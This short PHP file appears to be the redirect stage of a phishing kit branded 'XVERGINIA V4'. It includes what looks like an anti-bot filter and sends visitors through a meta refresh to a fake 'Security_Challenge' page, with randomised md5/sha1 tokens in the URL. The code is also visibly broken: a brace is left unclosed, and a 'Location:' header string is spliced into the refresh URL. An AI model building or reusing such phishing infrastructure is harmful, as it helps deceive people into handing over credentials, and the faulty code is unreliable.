<?php

include('Safe/xanbbx.php');
include('../functions/Config.php');
/*   
 
                               #=======================#
                              #    XVERGINIA V4       #
                              #=======================#
							  
							  
*/

	if($use_capatcha == "yes"){
			$xDIRx = "Location:Auth/Follow/Security_Challenge?enc=".md5(microtime())."&p=0&dispatch=".sha1(microtime())."";
}
	else {
		if($use_capatcha == "no"){
			$xDIRx = "LOCATION: ../index.php";
		}
?>
<html>
	<head>
		<meta http-equiv="refresh" content="0; URL=../<?php echo $xDIRx ?>" />
	</head>
</html>
